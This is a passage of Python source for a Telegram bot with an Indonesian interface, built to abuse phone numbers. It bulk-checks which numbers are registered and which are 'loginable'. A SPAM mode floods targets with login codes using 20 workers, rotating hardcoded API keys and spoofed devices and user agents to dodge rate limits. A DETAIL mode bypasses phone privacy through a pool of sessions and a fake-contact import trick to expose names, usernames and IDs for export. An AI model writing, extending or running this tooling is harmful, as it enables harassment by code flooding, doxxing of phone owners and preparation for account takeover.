        parts.append(f"Contoh: <code>254721330036:27492</code>\n\n")
        # Show first 20 loginable
        shown = 0
        for ph, data in list(pending.items())[:20]:
            icon = '📨' if 'Sms' in data['otp_type'] else '📲'
            parts.append(f"  {icon} <code>+{ph}</code>  ({data['otp_type']})\n")
            shown += 1
        if total_loginable > 20:
            parts.append(f"  ... dan {total_loginable - 20} lainnya\n")

    context.user_data[f'tgcheck_login_mode_{user_id}'] = True
    # Store for export
    context.user_data[f'tgcheck_login_results_{user_id}'] = {
        'sms': [ph for ph, d in pending.items() if 'Sms' in d.get('otp_type', '')],
        'app': [ph for ph, d in pending.items() if 'App' in d.get('otp_type', '')],
    }

    btn_rows = []
    if sms_count > 0 or app_count > 0:
        btn_rows.append([
            InlineKeyboardButton(f"📨 SMS ({sms_count})", callback_data=f"loginexp_sms_{user_id}"),
            InlineKeyboardButton(f"📲 APP ({app_count})", callback_data=f"loginexp_app_{user_id}"),
            InlineKeyboardButton(f"📋 ALL ({total_loginable})", callback_data=f"loginexp_all_{user_id}"),
        ])
    btn_rows.append([
        InlineKeyboardButton("❌ SELESAI", callback_data=f"loginexp_done_{user_id}"),
    ])

    try:
        await msg.edit_text(
            _screen('CHECK · LOGIN', ''.join(parts), 'Home › Check › Login'),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(btn_rows),
        )
    except Exception:
        pass


async def _tgcheck_process_batch(phones: list, user_id: int, msg, context):
    """Proses batch nomor dengan 20 concurrent workers, update progress tiap 2 detik."""
    _tgcheck_active[user_id] = True
    _tgcheck_cancel_flags[user_id] = False

    total = len(phones)
    completed = 0
    reg_app = 0
    reg_sms = 0
    not_reg = 0
    banned = 0
    errors = 0
    results = []
    _lock = asyncio.Lock()
    _last_edit = [0.0]  # timestamp last edit

    async def _update_progress(force=False):
        nonlocal completed
        now = time.time()
        if not force and (now - _last_edit[0]) < 2.0:
            return
        _last_edit[0] = now
        pct = int(completed / total * 100) if total > 0 else 0
        bar_filled = int(pct / 5)
        bar_empty = 20 - bar_filled
        progress_bar = '\u2588' * bar_filled + '\u2591' * bar_empty
        active_workers = min(TGCHECK_MAX_WORKERS, total - completed)

        try:
            await msg.edit_text(
                _screen('CHECK TELEGRAM', (
                    f"{em(CE_LOADING,'\U0001f504')} <b>Mengecek {total} nomor...</b>\n\n"
                    f"  {em(CE_NOMOR,'\U0001f4de')} <b>Selesai:</b>  {completed}/{total}\n"
                    f"  {em(E6,'\U0001f680')} <b>Worker aktif:</b>  {active_workers}\n\n"
                    f"  <code>{progress_bar}</code>  <b>{pct}%</b>\n\n"
                    f"  {em(E1,'\u2705')} Terdaftar (Aktif): <b>{reg_app}</b>\n"
                    f"  {em(E6,'\U0001f4f1')} Terdaftar (SMS): <b>{reg_sms}</b>\n"
                    f"  {em(E2,'\u274c')} Tidak Terdaftar: <b>{not_reg}</b>\n"
                    f"  {em(E2,'\U0001f6ab')} Banned: <b>{banned}</b>\n"
                    f"  {em(E3,'\u26a0\ufe0f')} Error: <b>{errors}</b>"
                ), 'Home \u203a Check \u203a Processing'),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton(
                        "BATALKAN",
                        callback_data=f"tgcheck_cancel_{user_id}",
                        icon_custom_emoji_id=E2,
                        style="danger",
                    )
                ]]),
            )
        except Exception:
            pass

    async def _worker(phone):
        nonlocal completed, reg_app, reg_sms, not_reg, banned, errors
        phone_clean, status, detail = await _tgcheck_check_single(phone, user_id)

        async with _lock:
            results.append((phone_clean, status, detail))
            completed += 1
            if status == 'registered_app':
                reg_app += 1
            elif status in ('registered', 'registered_sms'):
                reg_sms += 1
            elif status == 'not_registered':
                not_reg += 1
            elif status == 'banned':
                banned += 1
            elif status != 'cancelled':
                errors += 1

            # Simpan ke DB
            try:
                cur.execute(
                    "INSERT INTO tgcheck_results (user_id, phone, status, detail) VALUES (?, ?, ?, ?)",
                    (user_id, phone_clean, status, detail)
                )
                conn.commit()
            except Exception:
                pass

        await _update_progress()

    # Initial progress
    await _update_progress(force=True)

    # Launch all workers
    tasks = [asyncio.create_task(_worker(phone)) for phone in phones]
    await asyncio.gather(*tasks, return_exceptions=True)

    _tgcheck_active[user_id] = False
    was_cancelled = _tgcheck_cancel_flags.get(user_id, False)

    # ── Build result ──
    reg_list = [r for r in results if r[1] in ('registered', 'registered_app', 'registered_sms')]
    unreg_list = [r for r in results if r[1] == 'not_registered']
    ban_list = [r for r in results if r[1] == 'banned']
    err_list = [r for r in results if r[1] not in ('registered', 'registered_app', 'registered_sms', 'not_registered', 'banned', 'cancelled')]
    cancel_list = [r for r in results if r[1] == 'cancelled']

    checked = len([r for r in results if r[1] != 'cancelled'])
    status_icon = em(E1, '\u2705') if not was_cancelled else em(E2, '\u26a0\ufe0f')

    body_parts = []
    body_parts.append(
        f"{status_icon} <b>{'SELESAI' if not was_cancelled else 'DIBATALKAN'}</b>\n\n"
        f"  {em(CE_NOMOR,'\U0001f4de')} <b>Total Dicek:</b>  {checked}/{total}\n"
        f"  {em(E1,'\u2705')} <b>Terdaftar (Aktif):</b>  {reg_app}\n"
        f"  {em(E6,'\U0001f4f1')} <b>Terdaftar (SMS):</b>  {reg_sms}\n"
        f"  {em(E2,'\u274c')} <b>Tidak Terdaftar:</b>  {len(unreg_list)}\n"
        f"  {em(E2,'\U0001f6ab')} <b>Banned:</b>  {len(ban_list)}\n"
        f"  {em(E3,'\u26a0\ufe0f')} <b>Error:</b>  {len(err_list)}"
    )
    if cancel_list:
        body_parts.append(f"  \u23f9 <b>Dibatalkan:</b>  {len(cancel_list)}")

    if reg_list:
        body_parts.append(f"\n{em(E1,'\u2705')} <b>\u2500\u2500 TERDAFTAR \u2500\u2500</b>")
        for p, s, d in reg_list[:30]:
            tag = '\U0001f4f2' if s == 'registered_app' else '\U0001f4e8'
            body_parts.append(f"  {tag} <code>+{p}</code>  <i>{d}</i>")
        if len(reg_list) > 30:
            body_parts.append(f"  <i>... dan {len(reg_list)-30} lainnya</i>")

    if unreg_list:
        body_parts.append(f"\n{em(E2,'\u274c')} <b>\u2500\u2500 TIDAK TERDAFTAR \u2500\u2500</b>")
        for p, s, d in unreg_list[:30]:
            body_parts.append(f"  \u274c <code>+{p}</code>")
        if len(unreg_list) > 30:
            body_parts.append(f"  <i>... dan {len(unreg_list)-30} lainnya</i>")

    if ban_list:
        body_parts.append(f"\n{em(E2,'\U0001f6ab')} <b>\u2500\u2500 BANNED \u2500\u2500</b>")
        for p, s, d in ban_list[:15]:
            body_parts.append(f"  \U0001f6ab <code>+{p}</code>")

    if err_list:
        body_parts.append(f"\n{em(E3,'\u26a0\ufe0f')} <b>\u2500\u2500 ERROR \u2500\u2500</b>")
        for p, s, d in err_list[:15]:
            body_parts.append(f"  \u26a0\ufe0f <code>+{p}</code>  \u2014 <i>{html.escape(d[:40])}</i>")

    body = '\n'.join(body_parts)

    buttons = []
    if reg_list:
        buttons.append([InlineKeyboardButton(
            "EXPORT TERDAFTAR",
            callback_data=f"tgcheck_export_reg_{user_id}",
            icon_custom_emoji_id=E1,
            style="success",
        )])
    if unreg_list:
        buttons.append([InlineKeyboardButton(
            "EXPORT TIDAK TERDAFTAR",
            callback_data=f"tgcheck_export_unreg_{user_id}",
            icon_custom_emoji_id=E2,
            style="danger",
        )])
    if reg_list or unreg_list:
        buttons.append([InlineKeyboardButton(
            "EXPORT SEMUA (.txt)",
            callback_data=f"tgcheck_export_all_{user_id}",
            icon_custom_emoji_id=CE_EXPORT,
            style="primary",
        )])
    buttons.append([InlineKeyboardButton(
        "KEMBALI",
        callback_data=f"menu_start_{user_id}",
        icon_custom_emoji_id=CE_BACK,
        style="danger",
    )])

    context.user_data[f'tgcheck_results_{user_id}'] = results

    try:
        await msg.edit_text(
            _screen('CHECK TELEGRAM', body, 'Home \u203a Check \u203a Hasil'),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    except Exception:
        try:
            short_body = (
                f"{status_icon} <b>{'SELESAI' if not was_cancelled else 'DIBATALKAN'}</b>\n\n"
                f"  {em(E1,'\u2705')} Terdaftar: <b>{len(reg_list)}</b>\n"
                f"  {em(E2,'\u274c')} Tidak: <b>{len(unreg_list)}</b>\n"
                f"  {em(E3,'\u26a0\ufe0f')} Error/Ban: <b>{len(ban_list) + len(err_list)}</b>\n\n"
                f"<i>Gunakan tombol Export untuk detail.</i>"
            )
            await msg.edit_text(
                _screen('CHECK TELEGRAM', short_body, 'Home \u203a Check \u203a Hasil'),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(buttons),
            )
        except Exception:
            pass

# ── SPAM CONFIG ──
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.80 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Linux; Android 13; OPPO Find X5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
]
_SPAM_API_POOL = [
    (37365889, "78969cf319a8f18260369f10d0ae053a"),
    (39191050, "2ee2a563b5e174e6c5f8009992722284"),
    (32251747, "1383994847f0c19770ecc2a7ac8220b5"),
]
_spam_api_idx = [0]
_SPAM_DEVICES = [
    "Samsung SM-S918B", "Samsung SM-G991B", "Pixel 7 Pro", "Pixel 8",
    "Xiaomi Redmi Note 12", "OnePlus 11", "OPPO Find X5",
    "Windows 10 Desktop", "Windows 11 Laptop",
]
_SPAM_SYSTEM_VERSIONS = ["Android 13", "Android 14", "Android 12", "Windows 10", "Windows 11"]

def _next_spam_api():
    idx = _spam_api_idx[0] % len(_SPAM_API_POOL)
    _spam_api_idx[0] += 1
    return _SPAM_API_POOL[idx]


async def _spam_via_api(phone: str, user_id: int) -> tuple:
    """Mode API: HTTP POST ke my.telegram.org/auth/send_password. Retry sampai berhasil."""
    if _spam_cancel_flags.get(user_id, False):
        return (phone, 'cancelled', 'Stopped')
    _ALL_UAS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.80 Mobile Safari/537.36",
    ]
    max_retries = 5
    for attempt in range(max_retries):
        if _spam_cancel_flags.get(user_id, False):
            return (phone, 'cancelled', 'Stopped')
        ua = random.choice(_ALL_UAS)
        try:
            loop = asyncio.get_event_loop()
            def _do_post():
                s = requests.Session()
                s.headers.update({'User-Agent': ua})
                return s.post('https://my.telegram.org/auth/send_password',
                              data={'phone': '+' + phone}, timeout=15)
            resp = await asyncio.wait_for(loop.run_in_executor(None, _do_post), timeout=18)
            body = resp.text.strip().lower()
            if resp.status_code == 200:
                if 'random_hash' in body:
                    return (phone, 'sent', 'Code sent!')
                elif 'too many' in body:
                    await asyncio.sleep(3)
                    continue
                else:
                    return (phone, 'error', f'{resp.text[:40]}')
            elif resp.status_code == 429:
                await asyncio.sleep(3)
                continue
            else:
                return (phone, 'error', f'HTTP {resp.status_code}')
        except asyncio.TimeoutError:
            continue
        except Exception as e:
            return (phone, 'error', f'{type(e).__name__}')
    return (phone, 'flood', 'Rate limited')


async def _spam_via_app(phone: str, user_id: int) -> tuple:
    """Mode APP: Telethon SendCodeRequest."""
    if _spam_cancel_flags.get(user_id, False):
        return (phone, 'cancelled', 'Stopped')
    api_id, api_hash = _next_spam_api()
    client = TelegramClient(
        StringSession(), api_id, api_hash,
        device_model=random.choice(_SPAM_DEVICES),
        system_version=random.choice(_SPAM_SYSTEM_VERSIONS),
        app_version=f"1.{random.randint(0,9)}.{random.randint(0,99)}",
    )
    client.flood_sleep_threshold = 0
    try:
        await asyncio.wait_for(client.connect(), timeout=8)
        await asyncio.wait_for(client(SendCodeRequest(
            phone_number='+' + phone, api_id=api_id,
            api_hash=api_hash, settings=CodeSettings(),
        )), timeout=12)
        return (phone, 'sent', f'APP #{api_id}')
    except (PhoneNumberUnoccupiedError, PhoneNumberBannedError,
            PhoneNumberInvalidError, PhoneNumberFloodError):
        return (phone, 'dead', 'Permanent')
    except FloodWaitError:
        return (phone, 'flood', 'FloodWait')
    except asyncio.TimeoutError:
        return (phone, 'error', 'Timeout')
    except Exception as e:
        return (phone, 'error', f'{type(e).__name__}')
    finally:
        try:
            await client.disconnect()
        except:
            pass


async def _tgcheck_process_spam(phones: list, user_id: int, msg, context, mode='app'):
    """SPAM: 20 workers concurrent via semaphore. Real-time, bukan batch."""
    _spam_active[user_id] = True
    _spam_cancel_flags[user_id] = False
    WORKERS = 20
    total_sent = 0
    total_flood = 0
    total_error = 0
    attempt_num = 0
    _last_edit = [0.0]
    _status_msg = ['Memulai...']

    async def _update(force=False, final=False):
        now = time.time()
        if not force and not final and (now - _last_edit[0]) < 2.0:
            return
        _last_edit[0] = now
        st = "AKTIF" if not final else "SELESAI"
        body = (
            f"{em(E3,'🔥')} <b>SPAM — {st}</b>\n\n"
            f"  {em(CE_NOMOR,'📞')} <b>Target:</b>  {len(phones)} nomor\n"
            f"  {em(E6,'🚀')} <b>Workers:</b>  {WORKERS} ({len(_SPAM_API_POOL)} API rotasi)\n"
            f"  {em(CE_WAKTU,'⏲')} <b>Attempt:</b>  #{attempt_num}\n\n"
            f"  {em(E1,'✅')} <b>Sent:</b>  {total_sent}\n"
            f"  {em(E3,'⏳')} <b>Flood:</b>  {total_flood}\n"
            f"  {em(E2,'❌')} <b>Error:</b>  {total_error}\n\n"
            f"  {em(CE_LOADING,'🔄')} <i>{html.escape(_status_msg[0][:80])}</i>"
        )
        mk = InlineKeyboardMarkup([[
            InlineKeyboardButton("⛔ STOP", callback_data=f"spam_stop_{user_id}",
                                 icon_custom_emoji_id=E2, style="danger")
        ]]) if not final else InlineKeyboardMarkup([[
            InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}",
                                 icon_custom_emoji_id=CE_BACK, style="danger")
        ]])
        try:
            await msg.edit_text(
                _screen('CHECK · SPAM', body, 'Home › Check › SPAM'),
                parse_mode=ParseMode.HTML, reply_markup=mk,
            )
        except Exception:
            pass

    await _update(force=True)
    sem = asyncio.Semaphore(WORKERS)

    async def _worker():
        nonlocal total_sent, total_flood, total_error, attempt_num
        while not _spam_cancel_flags.get(user_id, False):
            async with sem:
                if _spam_cancel_flags.get(user_id, False):
                    return
                attempt_num += 1
                ph = random.choice(phones)
                r = await _spam_via_app(ph, user_id)
                _, st, _ = r
                if st == 'sent':
                    total_sent += 1
                    _status_msg[0] = f'✅ #{total_sent} terkirim!'
                    await _update(force=True)
                elif st == 'flood':
                    total_flood += 1
                    _status_msg[0] = f'⏳ Flood — worker pause 30s...'
                    await _update()
                    await asyncio.sleep(30)
                elif st == 'cancelled':
                    return
                else:
                    total_error += 1
                    _status_msg[0] = f'⚠️ Error — retry 3s...'
                    await _update()
                    await asyncio.sleep(3)
                await asyncio.sleep(2)

    tasks = [asyncio.create_task(_worker()) for _ in range(WORKERS)]
    await asyncio.gather(*tasks, return_exceptions=True)

    _spam_active[user_id] = False
    _spam_cancel_flags.pop(user_id, None)
    _status_msg[0] = f'Total {total_sent} kode terkirim.'
    await _update(final=True)



async def _tgcheck_sender_lookup(sender_client, phone: str):
    """Lookup detail 1 nomor. Method 1: resolvePhone (clean), Method 2: importContacts (fallback).
    Timeout 20s per method."""
    res = {'phone': phone, 'found': False}

    # ── METHOD 1: resolvePhone (clean — no contact pollution) ──
    try:
        resolved = await asyncio.wait_for(
            sender_client(ResolvePhoneRequest(phone='+' + phone)), timeout=15
        )
        if resolved and resolved.users:
            u = resolved.users[0]
            res['found'] = True
            res['id'] = u.id
            res['first_name'] = u.first_name or ''
            res['last_name'] = u.last_name or ''
            res['username'] = u.username or ''
            res['premium'] = bool(getattr(u, 'premium', False))
            res['verified'] = bool(getattr(u, 'verified', False))
            res['year'] = _estimate_account_year(u.id)
            res['method'] = 'resolve'
            return res
    except FloodWaitError as e:
        res['flood'] = e.seconds
        return res
    except asyncio.TimeoutError:
        pass  # try fallback
    except Exception as e:
        # PhoneNotOccupied / Privacy errors — fallback to import
        err_name = type(e).__name__
        if 'NotOccupied' in err_name or 'Invalid' in err_name:
            return res  # phone definitely not on Telegram

    # ── METHOD 2: importContacts (fallback — works for privacy-locked) ──
    try:
        contact = InputPhoneContact(client_id=random.randint(0, 2**31), phone='+' + phone,
                                    first_name='C', last_name=phone[-4:])
        imported = await asyncio.wait_for(
            sender_client(ImportContactsRequest([contact])), timeout=20
        )
        users = imported.users or []
        if not users:
            return res
        u = users[0]
        res['found'] = True
        res['id'] = u.id
        # Import returns our fake contact name — fetch REAL profile via get_entity
        try:
            real = await asyncio.wait_for(
                sender_client.get_entity(u.id), timeout=10
            )
            res['first_name'] = real.first_name or ''
            res['last_name'] = real.last_name or ''
            res['username'] = real.username or ''
            res['premium'] = bool(getattr(real, 'premium', False))
            res['verified'] = bool(getattr(real, 'verified', False))
        except Exception:
            # Fallback: use import-returned values (may be contact alias)
            res['first_name'] = u.first_name or ''
            res['last_name'] = u.last_name or ''
            res['username'] = u.username or ''
            res['premium'] = bool(getattr(u, 'premium', False))
            res['verified'] = bool(getattr(u, 'verified', False))
        res['year'] = _estimate_account_year(u.id)
        res['method'] = 'import'
        try:
            await asyncio.wait_for(
                sender_client(DeleteContactsRequest([u.id])), timeout=10
            )
        except Exception:
            pass
    except FloodWaitError as e:
        res['flood'] = e.seconds
    except asyncio.TimeoutError:
        res['error'] = 'Timeout (20s)'
    except Exception as e:
        res['error'] = f"{type(e).__name__}: {str(e)[:60]}"
    return res


async def _anon_resolve_phone(phone: str):
    """Fallback: resolve phone via anonymous (fresh) client — no sender needed.
    Returns dict like _tgcheck_sender_lookup (found/error/flood)."""
    res = {'phone': phone, 'found': False}
    c = TelegramClient(StringSession(), TG_API_ID, TG_API_HASH)
    try:
        await asyncio.wait_for(c.connect(), timeout=15)
        resolved = await asyncio.wait_for(
            c(ResolvePhoneRequest(phone='+' + phone)), timeout=15
        )
        if resolved and resolved.users:
            u = resolved.users[0]
            res['found'] = True
            res['id'] = u.id
            res['first_name'] = u.first_name or ''
            res['last_name'] = u.last_name or ''
            res['username'] = u.username or ''
            res['premium'] = bool(getattr(u, 'premium', False))
            res['verified'] = bool(getattr(u, 'verified', False))
            res['year'] = _estimate_account_year(u.id)
            res['method'] = 'anon'
    except FloodWaitError as e:
        res['error'] = f'AnonFlood:{e.seconds}s'
    except Exception as e:
        err_name = type(e).__name__
        if 'NotOccupied' in err_name or 'Invalid' in err_name:
            pass  # not on Telegram
        else:
            res['error'] = f"Anon:{err_name}"
    finally:
        try:
            await c.disconnect()
        except Exception:
            pass
    return res


async def _tgcheck_process_sender(phones: list, user_id: int, msg, context, sender_info):
    """Proses batch via sender (mode DETAIL). 30 parallel workers + anon fallback."""
    _tgcheck_active[user_id] = True
    _tgcheck_cancel_flags[user_id] = False

    _clients = {}  # sender_id -> connected TelegramClient
    _clients_lock = asyncio.Lock()
    found = []
    notfound = []
    errors = []
    total = len(phones)
    _last_edit = [0.0]
    _completed = [0]
    _results_lock = asyncio.Lock()

    async def _get_client(s, force_reconnect=False):
        """Connect (cache) client utk sender. None kalau mati. Timeout 15s."""
        sid = s['id']
        async with _clients_lock:
            if sid in _clients and not force_reconnect:
                c = _clients[sid]
                try:
                    if c.is_connected():
                        return c
                except Exception:
                    pass
                try:
                    await c.disconnect()
                except Exception:
                    pass
                del _clients[sid]

        c = TelegramClient(StringSession(s['session']), TG_API_ID, TG_API_HASH)
        try:
            await asyncio.wait_for(c.connect(), timeout=15)
            authed = await asyncio.wait_for(c.is_user_authorized(), timeout=10)
            if not authed:
                _mark_sender_dead(s['id'])
                try:
                    await c.disconnect()
                except Exception:
                    pass
                return None
        except (asyncio.TimeoutError, Exception) as e:
            print(f"[DETAIL] Sender #{sid} connect fail: {e}")
            _mark_sender_dead(s['id'])
            try:
                await c.disconnect()
            except Exception:
                pass
            return None
        async with _clients_lock:
            _clients[sid] = c
        return c

    MAX_RETRIES_PER_PHONE = 3

    async def _update_progress():
        """Update progress message (rate-limited every 2s)."""
        now = time.time()
        if (now - _last_edit[0]) < 2.0:
            return
        _last_edit[0] = now
        done = _completed[0]
        pct = int(done / total * 100) if total else 0
        bar = '█' * int(pct / 5) + '░' * (20 - int(pct / 5))
        _, active = _pool_count(user_id)
        try:
            await msg.edit_text(
                _screen('CHECK · DETAIL', (
                    f"{em(CE_LOADING,'🟠')} <b>Deep lookup ({DETAIL_MAX_WORKERS} workers · pool: {active} siap)...</b>\n\n"
                    f"  {em(CE_NOMOR,'📞')} <b>Progress:</b>  {done}/{total}\n"
                    f"  <code>{bar}</code>  <b>{pct}%</b>\n\n"
                    f"  {em(E1,'✅')} Ketemu: <b>{len(found)}</b>\n"
                    f"  {em(E2,'❌')} Tidak: <b>{len(notfound)}</b>"
                ), 'Home › Check › Detail'),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("BATALKAN", callback_data=f"tgcheck_cancel_{user_id}",
                                         icon_custom_emoji_id=E2, style="danger")
                ]]),
            )
        except Exception:
            pass

    async def _process_one(phone: str):
        """Worker: lookup satu nomor via sender pool, fallback ke anon."""
        if _tgcheck_cancel_flags.get(user_id, False):
            return

        async with _detail_sem:
            if _tgcheck_cancel_flags.get(user_id, False):
                return

            retries = 0
            done_this_phone = False
            pool_exhausted = False

            while retries < MAX_RETRIES_PER_PHONE and not done_this_phone:
                if _tgcheck_cancel_flags.get(user_id, False):
                    return

                s = _pick_sender(user_id)
                if not s:
                    pool_exhausted = True
                    break

                client = await _get_client(s)
                if not client:
                    retries += 1
                    continue
                _mark_sender_used(s['id'])

                r = await _tgcheck_sender_lookup(client, phone)
                if r.get('flood'):
                    _mark_sender_flood(s['id'], r['flood'])
                    retries += 1
                    await asyncio.sleep(0.5)
                    continue
                elif r.get('error') and ('Unauthorized' in r['error'] or 'AuthKey' in r['error'] or 'Timeout' in r['error']):
                    if 'Timeout' in r.get('error', ''):
                        async with _clients_lock:
                            if s['id'] in _clients:
                                try:
                                    await _clients[s['id']].disconnect()
                                except Exception:
                                    pass
                                del _clients[s['id']]
                    else:
                        _mark_sender_dead(s['id'])
                    retries += 1
                    continue
                elif r.get('found'):
                    async with _results_lock:
                        found.append(r)
                    try:
                        cur.execute(
                            "INSERT INTO tgcheck_results (user_id, phone, status, detail) VALUES (?, ?, ?, ?)",
                            (user_id, phone, 'registered',
                             f"ID:{r['id']} | {r.get('first_name','')} {r.get('last_name','')} | @{r.get('username','-')} | Premium:{r['premium']} | {r.get('year','?')} | via:{r.get('method','?')}")
                        )
                        conn.commit()
                    except Exception:
                        pass
                    done_this_phone = True
                elif r.get('error'):
                    async with _results_lock:
                        errors.append((phone, r['error']))
                    done_this_phone = True
                else:
                    async with _results_lock:
                        notfound.append(phone)
                    done_this_phone = True

                await asyncio.sleep(0.5)

            # ── Fallback: anon resolvePhone when pool exhausted ──
            if not done_this_phone and (pool_exhausted or retries >= MAX_RETRIES_PER_PHONE):
                try:
                    r = await _anon_resolve_phone(phone)
                    if r.get('found'):
                        async with _results_lock:
                            found.append(r)
                        try:
                            cur.execute(
                                "INSERT INTO tgcheck_results (user_id, phone, status, detail) VALUES (?, ?, ?, ?)",
                                (user_id, phone, 'registered',
                                 f"ID:{r['id']} | {r.get('first_name','')} {r.get('last_name','')} | @{r.get('username','-')} | Premium:{r['premium']} | {r.get('year','?')} | via:anon")
                            )
                            conn.commit()
                        except Exception:
                            pass
                    elif r.get('error'):
                        async with _results_lock:
                            errors.append((phone, r['error']))
                    else:
                        async with _results_lock:
                            notfound.append(phone)
                except Exception:
                    async with _results_lock:
                        notfound.append(phone)

            _completed[0] += 1
            await _update_progress()

    try:
        # Launch all workers in parallel with semaphore limiting concurrency
        tasks = [asyncio.create_task(_process_one(ph)) for ph in phones]
        await asyncio.gather(*tasks, return_exceptions=True)
    except Exception as e:
        try:
            await msg.edit_text(
                _screen('CHECK · DETAIL', f"{em(E2,'❌')} Error: {html.escape(str(e)[:100])}"),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        _tgcheck_active[user_id] = False
        async with _clients_lock:
            for _c in _clients.values():
                try:
                    await _c.disconnect()
                except Exception:
                    pass
        return
    finally:
        async with _clients_lock:
            for _c in _clients.values():
                try:
                    await _c.disconnect()
                except Exception:
                    pass

    _tgcheck_active[user_id] = False
    was_cancelled = _tgcheck_cancel_flags.get(user_id, False)

    # ── Build aesthetic result cards with custom emojis ──
    icon = em(E1, '✅') if not was_cancelled else em(E2, '⚠️')
    parts = [
        f"{icon} <b>{'SELESAI' if not was_cancelled else 'DIBATALKAN'}</b>\n\n"
        f"  {em(CE_NOMOR,'📞')} <b>Total:</b>  {len(found)+len(notfound)+len(errors)}/{total}\n"
        f"  {em(E1,'✅')} <b>Ketemu:</b>  {len(found)}\n"
        f"  {em(E2,'❌')} <b>Tidak Ketemu:</b>  {len(notfound)}\n"
        f"  {em(E3,'⚠️')} <b>Error:</b>  {len(errors)}"
    ]

    for r in found[:25]:
        name = html.escape(f"{r.get('first_name','')} {r.get('last_name','')}".strip() or '(tanpa nama)')
        uname = f"@{r['username']}" if r.get('username') else '—'
        prem = f"{em(E6,'⭐')} Premium" if r.get('premium') else f"🔹 Reguler"
        parts.append(
            f"\n╭─ {em(CE_DETAIL_GEM,'💎')} <code>+{r['phone']}</code>\n"
            f"│ {em(CE_DETAIL_NAME,'👤')} <b>{name}</b>  ({html.escape(uname)})\n"
            f"│ {em(CE_DETAIL_ID,'🆔')} <code>{r['id']}</code>\n"
            f"│ {prem}  ·  {em(CE_DETAIL_DATE,'📅')} <b>{r.get('year','?')}</b>\n"
            f"╰────────────"
        )
    if len(found) > 25:
        parts.append(f"\n<i>... dan {len(found)-25} akun lainnya (lihat export)</i>")

    if notfound:
        parts.append(f"\n{em(E2,'❌')} <b>── TIDAK KETEMU ── ({len(notfound)})</b>")
        parts.append("<i>(tidak terdaftar / privasi nomor disembunyikan)</i>")
        for p in notfound[:15]:
            parts.append(f"  <code>+{p}</code>")

    context.user_data[f'tgcheck_sender_results_{user_id}'] = found

    buttons = []
    if found:
        buttons.append([InlineKeyboardButton("EXPORT DETAIL (.txt)", callback_data=f"tgcheck_export_detail_{user_id}",
                                             icon_custom_emoji_id=CE_EXPORT, style="success")])
        buttons.append([InlineKeyboardButton("EXPORT PREMIUM SAJA", callback_data=f"tgcheck_export_prem_{user_id}",
                                             icon_custom_emoji_id=E6, style="primary")])
    buttons.append([InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}",
                                         icon_custom_emoji_id=CE_BACK, style="danger")])

    try:
        await msg.edit_text(
            _screen('CHECK · DETAIL', '\n'.join(parts), 'Home › Check › Detail'),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    except Exception:
        try:
            await msg.edit_text(
                _screen('CHECK · DETAIL', (
                    f"{icon} <b>SELESAI</b>\n\n"
                    f"  {em(E1,'✅')} Ketemu: <b>{len(found)}</b>\n"
                    f"  {em(E2,'❌')} Tidak: <b>{len(notfound)}</b>\n\n"
                    f"<i>Hasil terlalu panjang, pakai Export.</i>"
                )),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(buttons),
            )
        except Exception:
            pass


async def _tgcheck_parse_phones_from_doc(update, context):
    """Parse nomor telepon dari file .txt yang di-reply atau dikirim."""
    msg = update.message
    doc = None
    if msg.reply_to_message and msg.reply_to_message.document:
